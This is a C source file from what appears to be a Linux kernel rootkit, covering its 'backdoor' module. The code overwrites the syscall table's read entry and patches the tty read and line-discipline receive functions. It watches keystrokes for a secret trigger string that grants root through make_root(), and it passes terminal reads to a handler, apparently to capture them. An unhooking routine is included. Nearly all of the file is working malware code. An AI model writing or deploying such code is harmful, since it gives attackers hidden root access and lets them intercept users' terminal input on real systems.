#include <linux/tty.h>
#include <linux/delay.h>

#include "common.h"
#include "creds.h"
#include "backdoor.h"
#include "read.h"
#include "hook.h"

atomic_t receive_buf_count;
atomic_t receive_buf2_count;
struct tty_ldisc_ops *ops;

void (*current_receive_buf)(struct tty_struct *, const unsigned char *, char *, int);
int (*current_receive_buf2)(struct tty_struct *, const unsigned char *, char *, int);

ssize_t (*current_tty_read)(struct file *, char *, size_t, loff_t *);

void
backdoor_read(void)
{
    if (atomic_inc_return(&read_install_count) == 1) {
        disable_protection();
        sys_calls[__NR_read] = (void *)g7_read;
        enable_protection();
    }
}

void
backdoor_tty(void)
{
    if (!current_tty_read) {
        disable_protection();
        current_tty_read = ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read;
        ((struct file_operations *)kallsyms_lookup_name("tty_fops"))->read = (void *)g7_tty_read;
        enable_protection();
    }
}

ssize_t
g7_tty_read(struct file *file, char *buf, size_t count, loff_t *off)
{
    ssize_t ret = current_tty_read(file, buf, count, off);
    handle_pid(current->pid, buf, count);
    return ret;
}

void
unbackdoor(void)
{
    if (ops) {
        if (current_receive_buf2) {
            ops->receive_buf2 = current_receive_buf2;
            while (atomic_read(&receive_buf2_count) > 0);
            current_receive_buf2 = NULL;
        } else if (current_receive_buf) {
            ops->receive_buf = current_receive_buf;
            while (atomic_read(&receive_buf_count) > 0);
            current_receive_buf = NULL;
        }

        ops = NULL;
    }

    if (sys_read) {
            disable_protection();
            sys_calls[__NR_read] = (void *)sys_read;
            enable_protection();

            int cur;

            //Sleeping here is very important, as without it
            //we would stall the CPU..
            while ((cur = atomic_read(&read_count)) > 0) {
                DEBUG_INFO("Waiting for %d tasks", cur);
                msleep(250);
            }
    }
}


void
g7_receive_buf(struct tty_struct *_tty, const unsigned char *cp, char *fp, int count)
{
    static char *buf = G7_BACKDOOR_MSG;
    static size_t index = 0;

    atomic_inc(&receive_buf_count);

    if (count == 1) {
        // account for `echo` line discipline option by also
        // counting double occurrences of each character (@else)
        if (cp[0] == buf[index]) {
            ++index;
        } else if(!(index && cp[0] == buf[index - 1])) {
            index = 0;
        }

        if (index == strlen(buf)) {
            index = 0;
            make_root();
        }
    }

    if (current_receive_buf)
        current_receive_buf(_tty, cp, fp, count);

    atomic_dec(&receive_buf_count);
}

int
g7_receive_buf2(struct tty_struct *_tty, const unsigned char *cp, char *fp, int count)
{
    atomic_inc(&receive_buf2_count);
    g7_receive_buf(_tty, cp, fp, count);
    int ret = current_receive_buf2(_tty, cp, fp, count);
    atomic_dec(&receive_buf2_count);
    return ret;
}
